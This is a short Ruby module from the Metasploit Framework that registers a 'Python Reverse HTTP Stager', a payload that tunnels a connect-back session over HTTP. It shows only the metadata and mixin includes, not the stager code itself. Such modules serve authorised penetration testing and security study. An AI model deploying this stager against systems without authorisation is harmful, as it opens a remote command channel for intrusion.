##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseHttp

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Python Reverse HTTP Stager',
        'Description' => 'Tunnel communication over HTTP',
        'Author' => 'Spencer McIntyre',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::ReverseHttp,
        'Stager' => { 'Payload' => '' }
      )
    )
  end
end
